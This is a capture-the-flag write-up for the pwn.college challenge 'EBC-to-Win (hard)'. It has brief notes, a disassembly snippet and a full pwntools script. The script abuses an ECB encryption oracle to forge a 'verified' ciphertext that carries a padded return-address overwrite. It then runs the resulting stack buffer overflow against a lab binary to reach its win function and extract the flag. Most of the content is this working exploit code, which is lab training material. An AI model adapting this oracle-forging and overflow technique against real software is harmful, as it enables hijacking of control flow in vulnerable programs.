# EBC-to-Win (hard)

#### Dispatch gives the "verified" status when used so the header will need that for the check. The padding length can be found in a few locations. Either way it comes to 104, and the cmp looks for 16, a block. 
```asm
0x00000000004016c1 <+516>:   mov    -0x68(%rbp),%rax
0x00000000004016c5 <+520>:   cmp    $0x10,%rax

0x0000000000401751 <+660>:   lea    -0x70(%rbp),%rsi
0x0000000000401755 <+664>:   add    $0x10,%rsi
```
--------------------------------------

#### Find the address of win, as thats where the overflow needs to point to. Have to take the middle block of the return created from dispatch and add it to the verified header to create the overflow ciphertext.
```python
from pwn import *
import struct
import re

context.log_level = 'error'

def win_addr():
    elf = ELF('/challenge/vulnerable-overflow', checksec=False)
    return elf.symbols['win']


def encrypt(data):
    if len(data) != 16:
        data = data.ljust(16, b'\x90')
    
    io = process(['/challenge/dispatch'])
    io.send(data)
    io.shutdown('send')
    ct = io.recvall(timeout=1)
    io.close()

    return ct[16:32]

def header():
    io = process(['/challenge/dispatch'])
    io.send(b'')
    io.shutdown('send')
    verified = io.recvline()
    io.close()

    return verified[0:16]

ct = header()
win = win_addr()
ct_data = b'A' * 104 + struct.pack('<Q', win)

for i in range(0, len(ct_data), 16):
    strip = ct_data[i:i+16]
    block = encrypt(strip)
    ct += block

with open('/tmp/s.bin', 'wb') as f:
    f.write(ct)

with open('/tmp/s.bin', 'rb') as f:
    pack = f.read()


io = process('/challenge/vulnerable-overflow')
io.send(pack)
io.shutdown('send')
out = io.recvall(timeout=1)
flag = re.search(rb'pwn\.college\{(.*?)\}', out).group().decode()
print(flag)
```
